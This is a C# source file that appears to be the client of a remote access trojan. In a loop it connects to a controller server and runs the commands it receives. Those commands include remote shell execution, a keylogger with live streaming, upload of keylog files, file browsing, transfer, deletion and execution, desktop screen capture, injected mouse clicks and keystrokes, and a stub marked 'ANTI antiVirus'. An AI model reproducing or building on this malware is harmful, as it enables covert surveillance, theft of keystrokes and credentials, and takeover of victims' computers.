using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Linq; 

using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;


namespace ConsoleApplication5
{   

    class Program
    {
        private static Thread logger = new Thread(new ThreadStart(InterceptKeys.key_log));
        //TODO  make threads play nicely !! 
        public static  bool ServerUp { get; set; }

 
        static void Main(string[] args)
        {   
            FileStream fs=null;
            do {
            try
            {

                TcpClient tcpclnt = new TcpClient();
                Console.WriteLine("Connecting.....");

                do
                {
                    try
                    {
                        tcpclnt.Connect("127.0.0.1", 5202);
                        ServerUp = true;
                        Task checkServer = new Task(() => ConnectManager.CheckAlive(tcpclnt));
                        checkServer.Start();
                        Console.WriteLine(tcpclnt.Client.RemoteEndPoint.ToString());
                        break; 
                    }
                    catch (Exception e)
                    {
                        Console.Write(e); Thread.Sleep(1000);

                    }
                    // use the ipaddress as in the server program
                } while (true); 
                Console.WriteLine("Connected");

                

                
                // get the classes 
                Tools tool= new Tools();
                

                Stream stm = tcpclnt.GetStream();
                Cnx.ini(stm); 

                UTF8Encoding asen = new UTF8Encoding();
               
                byte[] ba = (new Env()).ini(); 
                
                  stm.Write(ba, 0, ba.Length);
                  
                
                
                  
                     
                   
                StringBuilder sb = new StringBuilder();
                do
                {
                    if (!ServerUp) throw new Exception("The Server Is Down ");
                    String a;
                    byte[] message = Cnx.GetMessage(out a);
                    String cnd = (message != null) ? asen.GetString(message) : ""; 
                    
                        
                    
                    

                    
                      // test if a comand has been received 
                    switch (a) {
                            /// START  CMD  
                        case "00":  //  cmd command 
                           
                            Cmd.comand(cnd); 
                           

                        break; 
                        
                        case "0a" :  // close cmd 
                            Cmd.stop();
                            break; 
                            /// END CMD  
                          
                            /// START  KEY LOGGER 
                        case "a1" : // ini keylogger information  
                            Env env = new Env(); 
                            env.keyloggerstat();
                            break; 

                        case "l1" : // Live keylogger 
                            InterceptKeys.live = true; 
                            if (!logger.IsAlive)
                            {
                                logger = new Thread(new ThreadStart(InterceptKeys.key_log));
                                logger.Start();
                            }
                            break;

                        case "l2": // stop keylog live 
                            InterceptKeys.live = false;

                            if (logger.IsAlive && !InterceptKeys.local)
                            {
                                logger.Abort();
                                while (logger.IsAlive) ;

                                InterceptKeys.stop_key_log();

                            }
                            break;
                        case "01":  // key logger 
                            InterceptKeys.startLocal(); 
                            if (!logger.IsAlive) 
                        {
                            logger = new Thread(new ThreadStart(InterceptKeys.key_log));
                            logger.Start();
                        }
                            break;
                        case "02": // stop keylog  
                            InterceptKeys.stopLocal(); 

                            if (logger.IsAlive && !InterceptKeys.live)
                            {
                                logger.Abort(); 
                            while (logger.IsAlive) ;
                            
                                InterceptKeys.stop_key_log();
                            
                            }
                            break;

                        case "tr":  // retrieve keylogers files  

                            fileTransfer.addUpload(cnd);
                            Task.Factory.StartNew(()=>fileTransfer.transfer()); 
                           
                            break; 
                             // show name files !
                                case "03" :  // get Kelogs File Names ; 
                               
                                String dirr = Directory.GetCurrentDirectory();
                                String output  = Cmd.DoCommand("/C cd " + dirr + " & dir *.gh /B");

                                if (output.Trim().Length > 0)
                                {
                                    String[] files = output.Split('\n');
                                    output = ""; 
                                    for (int i = 0; i < files.Length - 1; i++)
                                    {
                                        try
                                        {
                                            files[i] = files[i].Substring(0, files[i].Length - 4);

                                            files[i] = Encoding.ASCII.GetString(Convert.FromBase64String(files[i]));
                                            output += hardware.processorId()+'\0'+files[i] + "\n";
                                        }
                                        catch {
                                            // ignore stupid output empty files  
                                        }
                                    }
                                }
                                
                                Cnx.sendString("03"+output); 
                                break ; 
                           /// END KEY LOGGER 
                           /// 
                       
                            // BEGIN FILE HAndeling 
                        case "dl" : // delete file 

                            // TODO : Confermation !! 
                                try
                                {
                                    if (File.Exists(cnd)) {
                                        File.Delete(cnd); 
                                    }
                                }
                                catch { 
                                
                                }
                                break; 

                            /*

                            
                        case "04":
                            String Qlt = msg.Substring(2).Trim();
                            long qlt = 75L;
                            try {qlt = Convert.ToInt32(Qlt);qlt=(qlt==0)?75L:qlt;}
                            catch{ }

                            Tools.sendScreenShot(stm,qlt);
                            break;*/


                        // NEW VERSION  
                        // Desktop !! 
                        case "05": /// statrt monotiring desktop 
                          

                            if (!Desktop.isWorking()) {
                               Task.Factory.StartNew(() => Desktop.work());
                                 
                            }
                            break;
                            /// follow 05
                        case "b5" : //  make sure the connection is still alive 
                            Desktop.setKeepGoing();
                            break;
                        case "c5": // change in the compression
                            long param;
                            long.TryParse(cnd, out param);
                            Desktop.setCompress(param);
                            break;
                        case "f5": // change in frame speed 
                            int speed;
                            int.TryParse(cnd, out speed);
                            Desktop.setSleep(speed);
                            break;
                        case "q5": // change in quality
                           
                            long.TryParse(cnd, out param);
                            Desktop.setQuality(param);
                            break;
                        case "e5": // end desktop 
                            Desktop.stop();
                            break;


                        case "90":  //  Clicks sent 
                            String action = cnd;
                            String[] arg = action.Split('-');
                             
                            switch (arg[2])
                            { 
                                case "1":
                                    Click.left(float.Parse(arg[0]), float.Parse(arg[1]));
                                    break;
                                case "2":
                                    Click.middle(float.Parse(arg[0]), float.Parse(arg[1]));
                                    break;
                                case "3":
                                    Click.right(float.Parse(arg[0]), float.Parse(arg[1]));
                                    break;
                                case "4":
                                    Click.leftd(float.Parse(arg[0]), float.Parse(arg[1]));
                                    break;
                            }
                            break;

                            /// END desktop !! 

                            // BEGIN     Speak
                        case "i7":
                            Cnx.sendString("i7"+speak.getVoices());
                            break; 
                        case "e7" :
                            Cnx.sendString("e7" + speak.getEtat());
                            break;
                        case "r7" :
                            speak.setRate(int.Parse(cnd));
                            break; 
                        case  "v7" :
                            speak.setVolume(int.Parse(cnd)) ; 
                            break ; 
                        case "s7" :
                            speak.setVoice(cnd);
                            break; 
                        case "07":
                            speak.say(cnd); 


                            break; 

                            // End Speak 

                            // BEGIN navigate Files 
                        case "08":
                            
                            Cnx.sendString("08"+FileNav.get_drives(2, Directory.GetCurrentDirectory()));
                            
                            break;

                        case "09" : 


                        

                        case "91" : // receive keyboard clicks 
                            
                            KeybClick.type(message);
                            Console.WriteLine("REcieved");
                            break;

                            // BEGING file Navigation 

                        case "92":  // receive get directory by path
                            
                            
                            Cnx.sendString("92"+FileNav.get_drives(1,cnd));
                            
                            break;

                        case "93": // dynamic navigate 
                           
                           Cnx.sendString("93"+FileNav.dynamic_nav(cnd) +"\n<\n"+FileNav.get_nav_path());
                           
                            break;
               
                        case "94" : // send file 
                            fileTransfer.addUpload(cnd);
                            Task.Factory.StartNew(()=>fileTransfer.transfer()); 
                            break ;
                            // receiving file
                        case "s0" : 
                           String fileNames = cnd.Trim();
                          
                                String[] fileinfo = fileNames.Split(':');
                                
                                long filesize = long.Parse(fileinfo[1]);
                                fs = new FileStream(fileinfo[0],FileMode.Create,FileAccess.Write);
                                
                                fileTransfer.addDownload(fileinfo[2], fs); 
                                break;
                        case "s1": // receive file   
                                 // for MD5 encoding 
                                byte[] b = new byte[message.Length - 32];
                                byte[] c = new byte[32]; 
                                    Array.Copy(message, 0, c,0,32); 
                                    Array.Copy(message, 32, b,0, message.Length - 32);
                                    var id = asen.GetString(c); 
                                
                               
                                fs = fileTransfer.getHandle(id); 
                                
                                if(fs != null)fs.WriteAsync(b, 0, b.Length);
                                
                                break;
                        case "s2":
                                // if(fs.Length < filesize)  TODO  :  lost data handel  
                              
                                fileTransfer.Close(cnd); 
                                 
                                break; 
                        case "96":
                             
                            if (File.Exists(FileNav.get_nav_path() + Path.DirectorySeparatorChar + cnd))
                            File.Delete(FileNav.get_nav_path()+Path.DirectorySeparatorChar+cnd);
                            break;
                        case "97":
                            if (File.Exists(FileNav.get_nav_path() + Path.DirectorySeparatorChar + cnd)) 
                                System.Diagnostics.Process.Start(FileNav.get_nav_path() + Path.DirectorySeparatorChar + cnd);
                            break;
                        case "98":
                            Console.WriteLine("searching"); 
                            Cnx.sendString("98"+FileNav.Search(cnd)) ;

                            break; 

                            // BULK BUTTONS SPECIFIC OPTIONS \\
                           
                        
                            // Search FILEs
                        case "s9" :
                            
                            String []stuff = cnd.Split('\0') ;
                            Cnx.sendString("s9" + FileNav.Search(stuff[0], stuff[1])); 
                            break; 

                            // ANTI antiVirus 
                        case "v9" :
                            break; 
                    }

                } while (true);
                //  tcpclnt.Close();
            }
            
            catch (Exception e)
            {
                Console.WriteLine("Error..... " + e.StackTrace + "\n" + e);
                System.Threading.Thread.Sleep(10000); //  sleep time after cnx error  msec

            } 
            }while(true);
            
          
            }
    }
}
